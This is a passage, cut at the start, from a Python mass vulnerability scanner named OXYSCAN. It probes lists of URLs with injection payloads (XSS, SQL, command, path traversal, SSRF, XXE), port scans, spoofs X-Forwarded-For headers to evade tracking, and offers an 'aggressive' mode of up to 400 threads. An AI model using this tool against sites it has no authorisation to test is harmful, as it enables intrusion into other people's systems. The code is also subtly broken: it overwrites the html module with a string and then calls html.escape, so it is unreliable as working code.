            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        if random.random() > 0.5:
            headers['X-Forwarded-For'] = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        
        return headers
    
    def scan_url(self, url):
        """Deep scan single URL"""
        print(f"{Fore.CYAN}[DEEP SCAN] {url}{Style.RESET_ALL}")
        
        scan_result = {
            'url': url,
            'vulnerabilities': [],
            'technologies': [],
            'cves': [],
            'endpoints': [],
            'ports': [],
            'scan_time': time.time()
        }
        
        try:
            # Phase 1: Reconnaissance
            technologies = self.detect_technologies(url)
            scan_result['technologies'] = technologies
            
            # Phase 2: CVE Detection
            cves = self.cve_detector.detect_technology_cves(technologies)
            scan_result['cves'] = cves
            
            # Phase 3: Endpoint Discovery
            endpoints = self.discover_endpoints(url)
            scan_result['endpoints'] = endpoints
            
            # Phase 4: Port Scanning
            ports = self.port_scan(urlparse(url).netloc)
            scan_result['ports'] = ports
            
            # Phase 5: Vulnerability Scanning
            vulnerabilities = self.deep_vulnerability_scan(url)
            scan_result['vulnerabilities'] = vulnerabilities
            
            # Phase 6: CVE Mapping for vulnerabilities
            for vuln in vulnerabilities:
                vuln_cves = self.cve_detector.detect_vulnerability_cves(vuln['type'], vuln.get('evidence', ''))
                if vuln_cves:
                    vuln['related_cves'] = vuln_cves
            
        except Exception as e:
            print(f"{Fore.RED}[ERROR] {url}: {e}{Style.RESET_ALL}")
            scan_result['error'] = str(e)
        
        return scan_result
    
    def detect_technologies(self, url):
        """Detect web technologies"""
        technologies = []
        
        try:
            response = self.session.get(url, timeout=10)
            headers = str(response.headers).lower()
            body = response.text.lower()
            
            for tech, patterns in TECH_FINGERPRINTS.items():
                # Check headers
                for header_pattern in patterns.get("headers", []):
                    if header_pattern.lower() in headers:
                        technologies.append(tech)
                        break
                
                # Check body patterns
                for body_pattern in patterns.get("body_patterns", []):
                    if body_pattern.lower() in body:
                        technologies.append(tech)
                        break
            
            # Additional detection from cookies
            for cookie in response.cookies:
                cookie_str = str(cookie).lower()
                if 'php' in cookie_str and 'PHP' not in technologies:
                    technologies.append('PHP')
                elif 'jsessionid' in cookie_str and 'Java' not in technologies:
                    technologies.append('Java')
                elif 'wordpress' in cookie_str and 'WordPress' not in technologies:
                    technologies.append('WordPress')
            
        except Exception as e:
            print(f"{Fore.YELLOW}[TECH DETECT ERROR] {e}{Style.RESET_ALL}")
        
        return list(set(technologies))
    
    def discover_endpoints(self, url):
        """Discover endpoints on target"""
        endpoints = set()
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract links
            for tag in soup.find_all(['a', 'link', 'script', 'img', 'form']):
                href = tag.get('href') or tag.get('src') or tag.get('action')
                if href:
                    full_url = urljoin(url, href)
                    if urlparse(full_url).netloc == urlparse(url).netloc:
                        endpoints.add(full_url)
            
            # Extract from JavaScript
            js_patterns = [
                r'["\'](/[^"\']+)["\']',
                r'["\'](https?://[^"\']+)["\']',
                r'url\(["\']?([^"\'\)]+)["\']?\)',
            ]
            
            for pattern in js_patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    full_url = urljoin(url, match)
                    if urlparse(full_url).netloc == urlparse(url).netloc:
                        endpoints.add(full_url)
            
        except Exception as e:
            print(f"{Fore.YELLOW}[ENDPOINT ERROR] {e}{Style.RESET_ALL}")
        
        return list(endpoints)[:50]  # Limit to 50
    
    def port_scan(self, domain):
        """Fast port scanning"""
        open_ports = []
        
        def check_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((domain, port))
                sock.close()
                return port if result == 0 else None
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(check_port, port) for port in CONFIG['common_ports'][:20]]  # First 20 ports
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    open_ports.append(result)
        
        return open_ports
    
    def deep_vulnerability_scan(self, url):
        """Deep vulnerability scanning"""
        vulnerabilities = []
        
        # Test each vulnerability type
        test_categories = ['xss', 'sqli', 'cmdi', 'path_traversal', 'ssrf', 'xxe']
        
        for category in test_categories:
            try:
                vulns = self.test_vulnerability_category(url, category)
                vulnerabilities.extend(vulns)
            except Exception as e:
                print(f"{Fore.YELLOW}[{category.upper()} ERROR] {e}{Style.RESET_ALL}")
        
        return vulnerabilities
    
    def test_vulnerability_category(self, url, category):
        """Test specific vulnerability category"""
        vulnerabilities = []
        payloads = self.payload_gen.payloads.get(category, [])
        
        if not payloads:
            return []
        
        # Get injection points
        injection_points = self.get_injection_points(url)
        
        for point in injection_points:
            for payload in payloads[:15]:  # Test first 15 payloads
                try:
                    test_url, method = self.inject_payload(url, point, payload)
                    
                    if method == 'GET':
                        response = self.session.get(test_url, timeout=10, allow_redirects=False)
                    else:
                        response = self.session.post(test_url, data={point: payload}, timeout=10, allow_redirects=False)
                    
                    # Check if vulnerable using Nuclei-style detection
                    if self.nuclei_scanner.scan_response(response, payload, category):
                        vuln = {
                            'type': category,
                            'parameter': point,
                            'payload': payload,
                            'method': method,
                            'url': test_url,
                            'status_code': response.status_code,
                            'evidence': response.text[:500],
                            'timestamp': datetime.now().isoformat()
                        }
                        vulnerabilities.append(vuln)
                        
                        print(f"{Fore.GREEN}[VULN] {category.upper()} in {point} via {method}{Style.RESET_ALL}")
                        
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def get_injection_points(self, url):
        """Get injection points from URL"""
        points = []
        
        parsed = urlparse(url)
        
        # URL parameters
        query_params = parse_qs(parsed.query)
        points.extend(query_params.keys())
        
        # Path components (for path traversal)
        if parsed.path:
            points.append('path_traversal')
        
        return list(set(points))
    
    def inject_payload(self, url, point, payload):
        """Inject payload and return URL and method"""
        parsed = urlparse(url)
        
        if point == 'path_traversal':
            # For path traversal, modify the path
            new_path = parsed.path + payload if '..' in payload else payload
            new_url = parsed._replace(path=new_path).geturl()
            return new_url, 'GET'
        else:
            # For query parameters
            query_dict = parse_qs(parsed.query)
            query_dict[point] = [payload]
            new_query = urlencode(query_dict, doseq=True)
            new_url = parsed._replace(query=new_query).geturl()
            return new_url, 'GET'
    
    def mass_scan(self, urls_file, output_html):
        """Mass scan from file and generate HTML report"""
        print(f"{Fore.CYAN}[MASS SCAN STARTED]{Style.RESET_ALL}")
        
        # Read URLs
        with open(urls_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        print(f"{Fore.YELLOW}[TARGETS] {len(urls)} URLs loaded{Style.RESET_ALL}")
        
        # Parallel scanning
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_url = {executor.submit(self.scan_url, url): url for url in urls}
            
            for future in concurrent.futures.as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    result = future.result(timeout=180)
                    self.results[url] = result
                    
                    # Update statistics
                    vuln_count = len(result.get('vulnerabilities', []))
                    cve_count = len(result.get('cves', []))
                    
                    if vuln_count > 0 or cve_count > 0:
                        print(f"{Fore.GREEN}[+] {url}: {vuln_count} vulns, {cve_count} CVEs{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.YELLOW}[-] {url}: No findings{Style.RESET_ALL}")
                    
                except Exception as e:
                    print(f"{Fore.RED}[!] {url}: Error - {e}{Style.RESET_ALL}")
        
        # Generate HTML report
        self.generate_html_report(output_html)
        
        # Print statistics
        self.print_statistics()
    
    def generate_html_report(self, output_file):
        """Generate comprehensive HTML report"""
        print(f"{Fore.CYAN}[GENERATING HTML REPORT]{Style.RESET_ALL}")
        
        html_content = self.create_html_template()
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"{Fore.GREEN}[REPORT] Saved to {output_file}{Style.RESET_ALL}")
    
    def create_html_template(self):
        """Create HTML report template"""
        total_vulns = sum(len(r.get('vulnerabilities', [])) for r in self.results.values())
        total_cves = sum(len(r.get('cves', [])) for r in self.results.values())
        total_urls = len(self.results)
        scan_duration = time.time() - self.start_time
        
        # Sort results by vulnerability count
        sorted_results = sorted(
            self.results.items(),
            key=lambda x: len(x[1].get('vulnerabilities', [])),
            reverse=True
        )
        
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OXYSCAN v13.0 - Ultimate Vulnerability Report</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f0f23; color: #ccc; line-height: 1.6; }}
        .container {{ max-width: 1400px; margin: 0 auto; padding: 20px; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 40px; border-radius: 10px; margin-bottom: 30px; text-align: center; }}
        .header h1 {{ color: white; font-size: 2.8em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }}
        .header p {{ color: #e0e0e0; font-size: 1.2em; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }}
        .stat-card {{ background: #1a1a2e; padding: 25px; border-radius: 8px; text-align: center; border-left: 5px solid #667eea; }}
        .stat-card.critical {{ border-color: #ff4757; }}
        .stat-card.high {{ border-color: #ffa502; }}
        .stat-card.medium {{ border-color: #ffdd59; }}
        .stat-card.low {{ border-color: #2ed573; }}
        .stat-number {{ font-size: 2.5em; font-weight: bold; margin: 10px 0; }}
        .stat-label {{ color: #aaa; font-size: 0.9em; text-transform: uppercase; letter-spacing: 1px; }}
        .results-section {{ margin-bottom: 40px; }}
        .section-title {{ font-size: 1.8em; color: #667eea; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 2px solid #667eea; }}
        .url-card {{ background: #1a1a2e; border-radius: 8px; margin-bottom: 20px; overflow: hidden; border: 1px solid #2a2a3e; }}
        .url-header {{ background: #2a2a3e; padding: 15px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }}
        .url-header:hover {{ background: #3a3a4e; }}
        .url {{
            color: #4cd137;
            font-family: 'Courier New', monospace;
            font-size: 1.1em;
            word-break: break-all;
        }}
        .vuln-count {{ background: #ff4757; color: white; padding: 3px 10px; border-radius: 20px; font-size: 0.9em; }}
        .vuln-details {{ padding: 20px; display: none; }}
        .vuln-details.show {{ display: block; }}
        .vuln-table {{ width: 100%; border-collapse: collapse; margin-top: 15px; }}
        .vuln-table th {{ background: #2a2a3e; padding: 12px; text-align: left; color: #667eea; }}
        .vuln-table td {{ padding: 12px; border-bottom: 1px solid #2a2a3e; }}
        .vuln-table tr:hover {{ background: #2a2a3e; }}
        .vuln-type {{ display: inline-block; padding: 3px 10px; border-radius: 4px; font-size: 0.85em; font-weight: bold; }}
        .critical {{ background: #ff4757; color: white; }}
        .high {{ background: #ffa502; color: black; }}
        .medium {{ background: #ffdd59; color: black; }}
        .low {{ background: #2ed573; color: black; }}
        .cve-card {{ background: #2a2a3e; padding: 15px; border-radius: 6px; margin: 10px 0; border-left: 4px solid #ff4757; }}
        .cve-id {{ color: #ff4757; font-weight: bold; font-family: monospace; }}
        .tech-badge {{ display: inline-block; background: #667eea; color: white; padding: 3px 10px; border-radius: 20px; margin: 2px; font-size: 0.85em; }}
        .footer {{ text-align: center; padding: 30px; color: #666; font-size: 0.9em; border-top: 1px solid #2a2a3e; margin-top: 40px; }}
        .toggle-btn {{ background: #667eea; color: white; border: none; padding: 5px 15px; border-radius: 4px; cursor: pointer; }}
        .timestamp {{ color: #888; font-size: 0.9em; }}
        .payload {{ font-family: 'Courier New', monospace; background: #2a2a3e; padding: 5px; border-radius: 4px; font-size: 0.9em; color: #4cd137; }}
        .method {{ padding: 3px 8px; border-radius: 4px; font-weight: bold; font-size: 0.85em; }}
        .get {{ background: #2ed573; color: black; }}
        .post {{ background: #ffa502; color: black; }}
        pre {{ background: #1a1a2e; padding: 15px; border-radius: 6px; overflow-x: auto; color: #4cd137; font-family: 'Courier New', monospace; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 OXYSCAN v13.0 ULTIMATE</h1>
            <p>Comprehensive Vulnerability Assessment Report</p>
            <p class="timestamp">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">{total_urls}</div>
                <div class="stat-label">Targets Scanned</div>
            </div>
            <div class="stat-card critical">
                <div class="stat-number">{total_vulns}</div>
                <div class="stat-label">Vulnerabilities Found</div>
            </div>
            <div class="stat-card high">
                <div class="stat-number">{total_cves}</div>
                <div class="stat-label">CVEs Identified</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{scan_duration:.1f}s</div>
                <div class="stat-label">Scan Duration</div>
            </div>
        </div>
        
        <div class="results-section">
            <h2 class="section-title">🔍 Scan Results</h2>
"""
        
        # Add URL results
        for url, result in sorted_results:
            vulns = result.get('vulnerabilities', [])
            cves = result.get('cves', [])
            techs = result.get('technologies', [])
            
            if not vulns and not cves:
                continue  # Skip URLs with no findings
            
            html += f"""
            <div class="url-card">
                <div class="url-header" onclick="toggleDetails('{hashlib.md5(url.encode()).hexdigest()}')">
                    <div class="url">{url}</div>
                    <div class="vuln-count">{len(vulns)} vulns, {len(cves)} CVEs</div>
                </div>
                <div class="vuln-details" id="{hashlib.md5(url.encode()).hexdigest()}">
"""
            
            # Add technologies
            if techs:
                html += f"""
                    <div style="margin-bottom: 15px;">
                        <strong>Technologies Detected:</strong><br>
                        {" ".join([f'<span class="tech-badge">{tech}</span>' for tech in techs])}
                    </div>
"""
            
            # Add CVEs
            if cves:
                html += """
                    <div style="margin-bottom: 20px;">
                        <strong>📛 Associated CVEs:</strong>
"""
                for cve in cves:
                    severity_class = cve.get('severity', 'medium').lower()
                    html += f"""
                        <div class="cve-card">
                            <div><span class="cve-id">{cve.get('id', 'N/A')}</span> ({cve.get('year', 'N/A')}) - {cve.get('name', 'N/A')}</div>
                            <div>Severity: <span class="vuln-type {severity_class}">{cve.get('severity', 'N/A')}</span> | CVSS: {cve.get('cvss', 'N/A')} | Technology: {cve.get('technology', 'N/A')}</div>
"""
                    if cve.get('exploit'):
                        html += f"""
                            <div style="margin-top: 8px;">
                                <strong>Exploit:</strong><br>
                                <pre>{html.escape(cve['exploit'].get('exploit', ''))}</pre>
                                <div><em>{cve['exploit'].get('description', '')}</em></div>
                            </div>
"""
                    html += "</div>"
                html += "</div>"
            
            # Add vulnerabilities table
            if vulns:
                html += """
                    <strong>🔓 Vulnerabilities Found:</strong>
                    <table class="vuln-table">
                        <thead>
                            <tr>
                                <th>Type</th>
                                <th>Parameter</th>
                                <th>Method</th>
                                <th>Payload</th>
                                <th>Status</th>
                                <th>Evidence</th>
                                <th>Related CVEs</th>
                            </tr>
                        </thead>
                        <tbody>
"""
                for vuln in vulns:
                    severity = vuln.get('severity', 'high')
                    if vuln['type'] in ['sqli', 'rce', 'xxe']:
                        severity = 'critical'
                    elif vuln['type'] in ['xss', 'lfi', 'ssrf']:
                        severity = 'high'
                    
                    method_class = vuln.get('method', 'get').lower()
                    related_cves = vuln.get('related_cves', [])
                    
                    html += f"""
                            <tr>
                                <td><span class="vuln-type {severity}">{vuln['type'].upper()}</span></td>
                                <td>{html.escape(vuln.get('parameter', ''))}</td>
                                <td><span class="method {method_class}">{vuln.get('method', 'GET').upper()}</span></td>
                                <td><div class="payload">{html.escape(vuln['payload'][:50])}{'...' if len(vuln['payload']) > 50 else ''}</div></td>
                                <td>{vuln.get('status_code', 'N/A')}</td>
                                <td><div class="payload" title="{html.escape(vuln.get('evidence', '')[:200])}">View Evidence</div></td>
                                <td>
"""
                    if related_cves:
                        cve_list = []
                        for cve in related_cves[:3]:  # Show max 3 CVEs
                            cve_list.append(f'<span class="cve-id">{cve.get("id", "")}</span>')
                        html += "<br>".join(cve_list)
                    else:
                        html += "None"
                    
                    html += """
                                </td>
                            </tr>
"""
                html += """
                        </tbody>
                    </table>
"""
            
            html += """
                </div>
            </div>
"""
        
        # Add summary
        html += f"""
        </div>
        
        <div class="footer">
            <p>OXYSCAN v13.0 Ultimate - Powered by Advanced AI Detection Engine</p>
            <p>Scan completed in {scan_duration:.2f} seconds | {total_urls} targets | {total_vulns} vulnerabilities | {total_cves} CVEs</p>
            <p style="color: #ff4757; margin-top: 10px;">⚠️ This report is for authorized security testing only.</p>
        </div>
    </div>
    
    <script>
        function toggleDetails(id) {{
            const element = document.getElementById(id);
            element.classList.toggle('show');
        }}
        
        // Auto-expand cards with critical findings
        document.addEventListener('DOMContentLoaded', function() {{
            const urlCards = document.querySelectorAll('.url-card');
            urlCards.forEach(card => {{
                const vulnCount = card.querySelector('.vuln-count');
                if (vulnCount && vulnCount.textContent.includes('critical')) {{
                    const detailsId = card.querySelector('.vuln-details').id;
                    toggleDetails(detailsId);
                }}
            }});
        }});
        
        // Highlight critical rows
        const criticalRows = document.querySelectorAll('.vuln-type.critical');
        criticalRows.forEach(row => {{
            row.closest('tr').style.backgroundColor = '#3a1a1a';
        }});
    </script>
</body>
</html>
"""
        
        return html
    
    def print_statistics(self):
        """Print scan statistics"""
        total_time = time.time() - self.start_time
        total_urls = len(self.results)
        total_vulns = sum(len(r.get('vulnerabilities', [])) for r in self.results.values())
        total_cves = sum(len(r.get('cves', [])) for r in self.results.values())
        
        # Vulnerability breakdown
        vuln_types = defaultdict(int)
        cve_years = defaultdict(int)
        cve_severities = defaultdict(int)
        
        for result in self.results.values():
            for vuln in result.get('vulnerabilities', []):
                vuln_types[vuln['type']] += 1
            
            for cve in result.get('cves', []):
                year = cve.get('year', 'Unknown')
                cve_years[year] += 1
                severity = cve.get('severity', 'Unknown')
                cve_severities[severity] += 1
        
        print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🏆 ULTIMATE SCAN COMPLETED{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}📊 Total URLs Scanned: {total_urls}{Style.RESET_ALL}")
        print(f"{Fore.RED}⚠️  Total Vulnerabilities Found: {total_vulns}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📛 Total CVEs Identified: {total_cves}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}⏱️  Total Scan Time: {total_time:.2f} seconds{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}🚀 Average Time per URL: {total_time/max(1, total_urls):.2f} seconds{Style.RESET_ALL}")
        
        if vuln_types:
            print(f"\n{Fore.YELLOW}📈 Vulnerability Breakdown:{Style.RESET_ALL}")
            for vuln_type, count in sorted(vuln_types.items(), key=lambda x: x[1], reverse=True):
                color = Fore.RED if vuln_type in ['sqli', 'rce', 'xxe'] else Fore.YELLOW
                print(f"  {color}{vuln_type.upper()}: {count}{Style.RESET_ALL}")
        
        if cve_years:
            print(f"\n{Fore.CYAN}📅 CVE Year Distribution:{Style.RESET_ALL}")
            for year, count in sorted(cve_years.items(), reverse=True):
                print(f"  {year}: {count} CVEs")
        
        if cve_severities:
            print(f"\n{Fore.RED}🚨 CVE Severity Breakdown:{Style.RESET_ALL}")
            for severity, count in sorted(cve_severities.items(), key=lambda x: ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'].index(x[0]) if x[0] in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'] else 4):
                color = Fore.RED if severity == 'CRITICAL' else Fore.YELLOW if severity == 'HIGH' else Fore.GREEN
                print(f"  {color}{severity}: {count}{Style.RESET_ALL}")

def main():
    """Main function"""
    print(f"""{Fore.RED}
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║                         OXYSCAN v13.0 ULTIMATE                              ║
    ║                Advanced Vulnerability Scanner with CVE Detection            ║
    ║                    HTML Reports • Nuclei-style Templates • AI               ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
    {Style.RESET_ALL}""")
    
    parser = argparse.ArgumentParser(description='OXYSCAN v13.0 - Ultimate Vulnerability Scanner')
    parser.add_argument('-u', '--url', help='Single URL to scan')
    parser.add_argument('-f', '--file', help='File containing URLs (one per line)')
    parser.add_argument('-o', '--output', default='scan_report.html', help='HTML output file (default: scan_report.html)')
    parser.add_argument('-w', '--workers', type=int, default=200, help='Number of worker threads')
    parser.add_argument('--deep', action='store_true', help='Enable deep scanning mode')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode')
    parser.add_argument('--aggressive', action='store_true', help='Enable aggressive mode')
    
    args = parser.parse_args()
    
    if args.aggressive:
        CONFIG['max_workers'] = 400
        CONFIG['timeout'] = 60
        CONFIG['max_requests_per_second'] = 200
    
    scanner = UltimateScanner(max_workers=args.workers)
    
    try:
        if args.url:
            print(f"{Fore.CYAN}[SINGLE TARGET MODE]{Style.RESET_ALL}")
            result = scanner.scan_url(args.url)
            
            # Display results
            print(f"\n{Fore.GREEN}{'='*80}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}SCAN RESULTS FOR: {args.url}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}{'='*80}{Style.RESET_ALL}")
            
            if result.get('vulnerabilities'):
                print(f"{Fore.RED}VULNERABILITIES FOUND: {len(result['vulnerabilities'])}{Style.RESET_ALL}")
                for vuln in result['vulnerabilities']:
                    print(f"  {Fore.YELLOW}[{vuln['type'].upper()}] {vuln['parameter']} via {vuln.get('method', 'GET')}{Style.RESET_ALL}")
                    print(f"    Payload: {vuln['payload'][:60]}...")
                    print(f"    URL: {vuln['url']}")
                    if vuln.get('related_cves'):
                        print(f"    Related CVEs: {', '.join([cve['id'] for cve in vuln['related_cves']])}")
            
            if result.get('cves'):
                print(f"\n{Fore.YELLOW}CVEs IDENTIFIED: {len(result['cves'])}{Style.RESET_ALL}")
                for cve in result['cves']:
                    print(f"  {Fore.RED}{cve['id']} ({cve['year']}) - {cve['name']}{Style.RESET_ALL}")
                    print(f"    Severity: {cve['severity']} | CVSS: {cve.get('cvss', 'N/A')}")
            
            if result.get('technologies'):
                print(f"\n{Fore.CYAN}TECHNOLOGIES DETECTED: {', '.join(result['technologies'])}{Style.RESET_ALL}")
            
            # Generate mini HTML report for single URL
            scanner.results = {args.url: result}
            scanner.generate_html_report(f"single_scan_{hashlib.md5(args.url.encode()).hexdigest()[:8]}.html")
            
        elif args.file:
            if not os.path.exists(args.file):
                print(f"{Fore.RED}Error: File not found: {args.file}{Style.RESET_ALL}")
                return
            
            print(f"{Fore.CYAN}[MASS SCAN MODE]{Style.RESET_ALL}")
            scanner.mass_scan(args.file, args.output)
            
            print(f"\n{Fore.GREEN}✅ Scan completed! HTML report saved to: {args.output}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}📊 Open the HTML file in your browser to view detailed results.{Style.RESET_ALL}")
            
        else:
            parser.print_help()
            print(f"\n{Fore.YELLOW}Examples:{Style.RESET_ALL}")
            print(f"  {Fore.CYAN}Single URL:{Style.RESET_ALL} python oxyscan.py -u https://target.com")
            print(f"  {Fore.CYAN}Mass scan:{Style.RESET_ALL} python oxyscan.py -f urls.txt -o report.html")
            print(f"  {Fore.CYAN}Aggressive mode:{Style.RESET_ALL} python oxyscan.py -f urls.txt -o report.html --aggressive")
    
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[SCAN INTERRUPTED BY USER]{Style.RESET_ALL}")
        
        # Save partial results
        if scanner.results:
            scanner.generate_html_report(f"partial_scan_{int(time.time())}.html")
            print(f"{Fore.GREEN}Partial results saved to HTML file.{Style.RESET_ALL}")
            
    except Exception as e:
        print(f"{Fore.RED}[FATAL ERROR] {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
    print(f"\n{Fore.GREEN}[+] OXYSCAN v13.0 ULTIMATE - MISSION COMPLETE{Style.RESET_ALL}")